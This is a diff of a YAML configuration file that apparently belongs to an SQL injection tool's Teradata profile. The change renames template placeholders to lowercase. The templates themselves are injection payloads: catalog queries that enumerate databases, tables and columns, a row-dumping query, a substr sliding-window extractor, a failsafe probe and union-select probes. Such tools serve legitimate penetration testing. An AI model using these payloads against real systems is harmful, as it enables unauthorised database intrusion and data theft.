@@ -3,18 +3,18 @@ resource:
  info: |
   select 
       '-'
-      || '${ENCLOSE_VALUE_SQL}'
+      || '${enclose_value_sql}'
       || database
-      || '${ENCLOSE_VALUE_SQL}'
+      || '${enclose_value_sql}'
       || user
-      || '${TRAIL_SQL}'
+      || '${trail_sql}'
       
  schema: 
   database: |
    select 
-       '${ENCLOSE_VALUE_SQL}'
+       '${enclose_value_sql}'
        || DatabaseName
-       || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+       || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
    FROM (
        select 
            DatabaseName,
@@ -22,29 +22,29 @@ resource:
        from DBC.DBASE
    ) x
    where 1 = 1
-   {limit}
+   ${limit}
    
   table: |
    select 
-       '${ENCLOSE_VALUE_SQL}'
+       '${enclose_value_sql}'
        || TVMName
-       || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+       || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
    FROM (
        select 
            TVMName,
            ROW_NUMBER() over (ORDER BY TVMName) AS rnum
        from DBC.TVM t 
        inner join DBC.DBASE d on t.DatabaseId = d.DatabaseId
-       where DatabaseName = '${DATABASE}'
+       where DatabaseName = '${database}'
    ) x
    where 1 = 1
-   {limit}
+   ${limit}
    
   column: |
    select 
-       '${ENCLOSE_VALUE_SQL}'
+       '${enclose_value_sql}'
        || FieldName
-       || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+       || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
    FROM (
        select 
            FieldName,
@@ -54,29 +54,29 @@ resource:
            from DBC.TVFIELDS c 
            inner join DBC.TVM t on c.TableId = t.TVMId
            inner join DBC.DBASE d on t.DatabaseId = d.DatabaseId
-           where DatabaseName = '${DATABASE}'
-           and TVMName = '${TABLE}'
+           where DatabaseName = '${database}'
+           and TVMName = '${table}'
        )x
    )x
    where 1 = 1
-   {limit}
+   ${limit}
    
   row: 
    query: |
     SELECT 
-        '${ENCLOSE_VALUE_SQL}'
+        '${enclose_value_sql}'
         || r
-        || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+        || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
     from (
         select 
-            ${FIELDS} r, 
+            ${fields} r, 
             ROW_NUMBER() over (ORDER BY 1) AS rnum
-        from ${DATABASE}.${TABLE}
+        from ${database}.${table}
     )x
     where 1 = 1
-    {limit}
+    ${limit}
    fields: 
-    field: trim(coalesce(''||${FIELD}, ''))
+    field: trim(coalesce(''||${field}, ''))
     concat: "|| '%7f' ||"
     
 strategy: 
@@ -84,24 +84,24 @@ strategy:
   slidingWindow: |
    select
        /**
-        * If reach end of string (${LEAD}i) then NULLIF nullifies the result
+        * If reach end of string (${lead}i) then NULLIF nullifies the result
         */
-       '${LEAD}'
+       '${lead}'
        || NULLIF(
            substr(
-               (${INJECTION}),
-               ${INDEX}
+               (${injection}),
+               ${index}
            ),
-           '${TRAIL_SQL}'
+           '${trail_sql}'
         )
-  limit: and rnum BETWEEN ${LIMIT} AND ${LIMIT}
-  failsafe: trim('' || (1337${INDICE}7330%2b1))
+  limit: and rnum BETWEEN ${limit.value} AND ${limit.value}
+  failsafe: trim('' || (1337${indice}7330%2b1))
   calibrator: |
    cast(
        rpad(
-           '${CALIBRATOR_SQL}', 
+           '${calibrator_sql}', 
            1024, 
-           '${CALIBRATOR_SQL}'
+           '${calibrator_sql}'
        )
        as varchar(1024)
    )
@@ -112,6 +112,6 @@ strategy:
     - Teradata database
     
  normal: 
-  indices: union select ${INDICES} FROM (SELECT 1 AS x)x
-  capacity: (select '${LEAD}${INDICE}' || ${CALIBRATOR})
+  indices: union select ${indices} FROM (SELECT 1 AS x)x
+  capacity: (select '${lead}${indice}' || ${calibrator})
   orderBy: order by 1337
